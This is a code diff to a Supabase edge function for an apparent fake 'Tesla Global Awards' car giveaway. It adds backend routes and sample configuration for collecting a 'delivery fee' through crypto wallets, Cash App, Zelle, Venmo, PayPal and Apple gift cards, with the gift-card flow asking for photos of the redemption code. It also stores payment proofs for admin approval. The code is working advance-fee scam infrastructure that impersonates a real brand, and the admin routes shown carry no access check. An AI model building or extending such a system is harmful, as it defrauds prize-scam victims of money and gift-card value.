@@ -13,7 +13,7 @@ const SELF_BASE = SUPABASE_URL + "/functions/v1/tesla-api";
 // ── CORS ──────────────────────────────────────────────────────────────────────
 const CORS = {
   "Access-Control-Allow-Origin": "*",
-  "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
+  "Access-Control-Allow-Methods": "GET, POST, PUT, DELETE, OPTIONS",
   "Access-Control-Allow-Headers": "Content-Type, Authorization",
 };
 
@@ -22,6 +22,37 @@ function json(data: unknown, status = 200) {
     status,
     headers: { ...CORS, "Content-Type": "application/json" },
   });
+}
+
+
+// ── PAYMENT METHOD HELPERS ───────────────────────────────────────────────────
+const PAYMENT_METHOD_SAMPLE_CONFIG: Record<string, { description: string; config: Record<string, any> }> = {
+  paypal: { description: "Pay securely with your PayPal account or linked card", config: { businessName: "Tesla Global Awards LLC", email: "payments@teslaglobalawards.com", merchantId: "TM8XK2R9Q4ZPA", paypalMeLink: "https://paypal.me/teslaglobalawards", instructions: "Send the delivery fee via PayPal to our verified business account and include your Order ID in the note. Screenshot the confirmation and upload it as proof." } },
+  cashapp: { description: "Instant payment with your Cash App balance or debit card", config: { cashtag: "$TeslaGlobalAwards", accountName: "Tesla Global Awards", phone: "+1 (888) 472-3001", instructions: "Send the delivery fee to our verified Cash App account, add your Order ID in the For field, then upload a screenshot of the confirmation." } },
+  venmo: { description: "Fast, secure payments with Venmo", config: { username: "@TeslaGlobalAwards", accountName: "Tesla Global Awards LLC", instructions: "Send the delivery fee to our official Venmo handle, include your Order ID in the description, and upload the confirmation screen." } },
+  zelle: { description: "Send directly from your bank account with Zelle", config: { recipientName: "Tesla Global Awards LLC", email: "zelle@teslaglobalawards.com", phone: "+1 (415) 892-3401", instructions: "Send the delivery fee with Zelle to the registered email or phone number, include your Order ID in the memo, then upload confirmation." } },
+  bitcoin: { description: "Pay with Bitcoin on the Bitcoin network", config: { walletAddress: "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh", network: "Bitcoin (BTC) — Mainnet", confirmations: "3 confirmations required", instructions: "Send the exact delivery fee amount in BTC to the wallet address above using the BTC network only, then upload a screenshot showing the TX hash." } },
+  ethereum: { description: "Pay with Ethereum (ETH)", config: { walletAddress: "0x71C7656EC7ab88b098defB751B7401B5f6d8976F", network: "Ethereum Mainnet (ERC-20)", confirmations: "12 confirmations required", instructions: "Send the exact ETH equivalent of the delivery fee to the Ethereum Mainnet wallet and upload the confirmed transaction screenshot." } },
+  "usdt-erc20": { description: "Tether USD on the Ethereum network", config: { walletAddress: "0x71C7656EC7ab88b098defB751B7401B5f6d8976F", network: "Ethereum Mainnet (ERC-20)", tokenContract: "0xdAC17F958D2ee523a2206206994597C13D831ec7", instructions: "Send USDT on ERC-20 to the wallet address above and upload the confirmed transaction screenshot." } },
+  "usdt-trc20": { description: "Tether USD on the TRON network — lower fees", config: { walletAddress: "TYASr5UV6HEcXatwdFQfmLVUqQQQMUxHLS", network: "TRON Network (TRC-20)", instructions: "Send USDT on TRC-20 to the wallet address above and upload the confirmed transaction receipt screenshot." } },
+  creditcard: { description: "Visa, Mastercard, Amex, and Discover accepted", config: { acceptedCards: "Visa, Mastercard, American Express, Discover", processorName: "Tesla Awards Secure Payments", merchantAccount: "TGAWARDS-US-9041", supportPhone: "+1 (888) 472-3001", instructions: "Enter card details securely in the payment form. Transactions are encrypted and a confirmation is emailed after processing." } },
+  applegift: { description: "Pay with an Apple Gift Card — instant and private", config: { denominationsAccepted: "$25, $50, $100, $200 denominations accepted", purchaseLocations: "Apple Store, Apple.com, Walmart, Target, Best Buy, CVS, Walgreens", instructions: "Upload clear photos of the front and back of the Apple Gift Card with the redemption code fully visible and legible." } }
+};
+function paymentSlug(m: any): string { return String(m.slug || m.name || m.display_name || "").toLowerCase().replace(/[^a-z0-9]+/g, "-").replace(/^-|-$/g, ""); }
+function parseAccountDetails(raw: any): Record<string, any> { if (!raw) return {}; if (typeof raw === "object") return { ...raw }; try { return JSON.parse(raw); } catch { return {}; } }
+function enrichPaymentMethodRow(m: any) {
+  const slug = paymentSlug(m); const sample = PAYMENT_METHOD_SAMPLE_CONFIG[slug];
+  const config = { ...(sample?.config || {}), ...parseAccountDetails(m.account_details) };
+  if (m.wallet_address) config.walletAddress = m.wallet_address;
+  if (m.payment_instructions) config.instructions = m.payment_instructions;
+  if (m.qr_code_url) config.qrCode = m.qr_code_url;
+  return { id: slug || m.id, _dbId: m.id, name: m.display_name || m.name, type: m.type || "wallet", description: m.description || sample?.description || "", logo: m.logo_url || "", logo_url: m.logo_url || "", enabled: m.enabled !== false, displayOrder: m.sort_order || 0, sort_order: m.sort_order || 0, config, wallet_address: m.wallet_address || config.walletAddress || config.cashtag || config.username || config.email || "", payment_instructions: m.payment_instructions || config.instructions || "", lastUpdated: m.updated_at || m.created_at || "" };
+}
+function selectedCarLabel(carData: Record<string, any>): string { return String([carData.name, carData.model, carData.modelName, carData.title, carData.vehicle, carData.vehicleName, carData.displayName].find((v) => typeof v === "string" && v.trim()) || ""); }
+function toPaymentMethodRow(m: any) {
+  const config = typeof m.account_details === "object" ? m.account_details : parseAccountDetails(m.account_details);
+  const slug = String(m.slug || m.name || "").toLowerCase().replace(/[^a-z0-9]+/g, "-").replace(/^-|-$/g, "");
+  return { name: slug, slug, display_name: m.display_name || m.name || slug, type: m.type || "wallet", enabled: m.enabled !== false, logo_url: m.logo_url || "", wallet_address: m.wallet_address || "", account_details: JSON.stringify(config), payment_instructions: m.payment_instructions || config.instructions || "", sort_order: m.sort_order || 0, updated_at: new Date().toISOString() };
 }
 
 // ── CRYPTO HELPERS ────────────────────────────────────────────────────────────
@@ -844,6 +875,88 @@ async function handleAdminSaveSettings(req: Request) {
   return json({ success: true, deliveryFee: body.deliveryFee, paymentPhone: body.paymentPhone });
 }
 
+
+async function handlePaymentMethods(publicOnly: boolean) {
+  const qs = "select=*" + (publicOnly ? "&enabled=eq.true" : "") + "&order=sort_order.asc";
+  const r = await fetch(REST + "/payment_methods?" + qs, { headers: SB_HEADERS });
+  if (!r.ok) return json({ methods: [] });
+  const rows = await r.json();
+  return json({ methods: (rows || []).map(enrichPaymentMethodRow) });
+}
+
+async function handlePaymentMethodUpsert(req: Request) {
+  const m = await req.json();
+  const row = toPaymentMethodRow(m);
+  const lookup = await fetch(REST + "/payment_methods?select=id&or=(name.eq." + encodeURIComponent(row.name) + ",slug.eq." + encodeURIComponent(row.slug) + ")&limit=1", { headers: SB_HEADERS });
+  const existing = lookup.ok ? (await lookup.json())[0] : null;
+  if (existing?.id) {
+    const up = await fetch(REST + "/payment_methods?id=eq." + existing.id, { method: "PATCH", headers: { ...SB_HEADERS, Prefer: "return=minimal" }, body: JSON.stringify(row) });
+    if (!up.ok) return json({ error: await up.text() }, 500);
+    return json({ success: true, _db_id: existing.id });
+  }
+  const ins = await fetch(REST + "/payment_methods?select=id", { method: "POST", headers: { ...SB_HEADERS, Prefer: "return=representation" }, body: JSON.stringify({ ...row, created_at: new Date().toISOString() }) });
+  if (!ins.ok) return json({ error: await ins.text() }, 500);
+  const rows = await ins.json();
+  return json({ success: true, _db_id: rows[0]?.id });
+}
+
+async function handlePaymentMethodUpdate(req: Request, id: string) {
+  const m = await req.json();
+  const row = toPaymentMethodRow(m);
+  const up = await fetch(REST + "/payment_methods?id=eq." + id, { method: "PATCH", headers: { ...SB_HEADERS, Prefer: "return=minimal" }, body: JSON.stringify(row) });
+  if (!up.ok) return json({ error: await up.text() }, 500);
+  return json({ success: true, _db_id: id });
+}
+
+async function handlePaymentMethodDelete(id: string) {
+  const r = await fetch(REST + "/payment_methods?id=eq." + id, { method: "DELETE", headers: { ...SB_HEADERS, Prefer: "return=minimal" } });
+  if (!r.ok) return json({ error: await r.text() }, 500);
+  return json({ success: true });
+}
+
+async function handlePaymentSubmit(req: Request) {
+  const p = await req.json();
+  const sessionToken = p.sessionToken || "";
+  let userId = null;
+  if (sessionToken) {
+    const sess = await dbGet1("user_sessions", "user_id", { token: "eq." + sessionToken });
+    userId = sess.data?.user_id || null;
+  }
+  const proof = { order_id: p.order_id, user_id: userId, payment_method: p.paymentMethodName || p.paymentMethodId || "Unknown", amount: p.amount || p.deliveryFee || null, proof_url: p.proofData || null, proof_back_url: p.giftCardBack || p.cardBack || null, proof_type: "file", status: "pending", customer_name: p.customerName || null, car_model: p.carModel || null, created_at: new Date().toISOString() };
+  const { data, error } = await dbInsert("payment_proofs", proof, "id");
+  if (error) return json({ error: error.message }, 500);
+  return json({ success: true, proofId: data?.id, orderId: p.order_id });
+}
+
+async function handleAdminPaymentProofs() {
+  const r = await fetch(REST + "/payment_proofs?select=*&order=created_at.desc", { headers: SB_HEADERS });
+  if (!r.ok) return json({ proofs: [] });
+  const rawProofs = await r.json();
+  const orderIds = [...new Set(rawProofs.map((p: any) => p.order_id).filter(Boolean))];
+  const ordersMap: Record<string, any> = {}; const usersMap: Record<string, any> = {};
+  if (orderIds.length) {
+    const ordersR = await fetch(REST + "/orders?select=order_id,user_id,delivery_method,selected_cars(data)&order_id=in.(" + orderIds.join(",") + ")", { headers: SB_HEADERS });
+    const orders = ordersR.ok ? await ordersR.json() : [];
+    orders.forEach((o: any) => ordersMap[o.order_id] = o);
+    const userIds = [...new Set([...orders.map((o: any) => o.user_id), ...rawProofs.map((p: any) => p.user_id)].filter(Boolean))];
+    if (userIds.length) {
+      const usersR = await fetch(REST + "/giveaway_users?select=id,first_name,last_name,email,phone&id=in.(" + userIds.join(",") + ")", { headers: SB_HEADERS });
+      const users = usersR.ok ? await usersR.json() : [];
+      users.forEach((u: any) => usersMap[u.id] = u);
+    }
+  }
+  const proofs = rawProofs.map((p: any) => { const ord = ordersMap[p.order_id]; const u = (ord ? usersMap[ord.user_id] : null) || (p.user_id ? usersMap[p.user_id] : null); const carRaw = Array.isArray(ord?.selected_cars) ? ord.selected_cars[0] : ord?.selected_cars; const carData = carRaw?.data || {}; const dmRaw = ord?.delivery_method || {}; const dmLabel = typeof dmRaw === "string" ? dmRaw : dmRaw.name || dmRaw.label || dmRaw.type || ""; const joinedName = u ? [u.first_name, u.last_name].filter(Boolean).join(" ") : ""; return { ...p, user_name: p.customer_name || joinedName || u?.email || "", user_email: p.customer_email || u?.email || "", user_phone: p.customer_phone || u?.phone || "", car_model: selectedCarLabel(carData) || p.car_model || "", delivery_method: p.delivery_method || dmLabel }; });
+  return json({ proofs });
+}
+
+async function handleProofStatus(id: string, status: "approved" | "rejected", reason = "") {
+  const patch: Record<string, unknown> = { status, reviewed_at: new Date().toISOString(), reviewed_by: "admin" };
+  if (status === "rejected") patch.admin_notes = reason;
+  const { error } = await dbUpdate("payment_proofs", patch, { id: "eq." + id });
+  if (error) return json({ error: error.message }, 500);
+  return json({ success: true });
+}
+
 async function handleAdminOrders(_req: Request) {
   const r = await fetch(REST + "/orders?select=order_id,tracking_number,status,order_date,estimated_delivery,delivery_method,payment_method,giveaway_users(email)&order=order_date.desc&limit=200", { headers: SB_HEADERS });
   if (!r.ok) return json({ orders: [] });
@@ -900,6 +1013,17 @@ Deno.serve(async (req) => {
     if (route === "/api/login" && req.method === "POST") return await handleLogin(req);
     if (route === "/api/session" && req.method === "GET") return await handleSession(req);
     if (route === "/api/order" && req.method === "POST") return await handleOrder(req);
+
+    if (route === "/api/payment-methods" && req.method === "GET") return await handlePaymentMethods(true);
+    if (route === "/api/admin/payment-methods" && req.method === "GET") return await handlePaymentMethods(false);
+    if (route === "/api/admin/payment-methods/upsert" && req.method === "POST") return await handlePaymentMethodUpsert(req);
+    const pmM = route.match(/^\/api\/admin\/payment-methods\/([^/]+)$/);
+    if (pmM && req.method === "PUT") return await handlePaymentMethodUpdate(req, pmM[1]);
+    if (pmM && req.method === "DELETE") return await handlePaymentMethodDelete(pmM[1]);
+    if (route === "/api/payment/submit" && req.method === "POST") return await handlePaymentSubmit(req);
+    if (route === "/api/admin/payment-proofs" && req.method === "GET") return await handleAdminPaymentProofs();
+    if (route === "/api/admin/payment-proofs/approve" && req.method === "POST") { const b = await req.json(); return await handleProofStatus(b.id, "approved"); }
+    if (route === "/api/admin/payment-proofs/reject" && req.method === "POST") { const b = await req.json(); return await handleProofStatus(b.id, "rejected", b.reason || ""); }
     const trackM = route.match(/^\/api\/order\/tracking\/([^/]+)$/);
     if (trackM && req.method === "GET") return await handleTracking(trackM[1]);
     const orderM = route.match(/^\/api\/order\/([^/]+)$/);
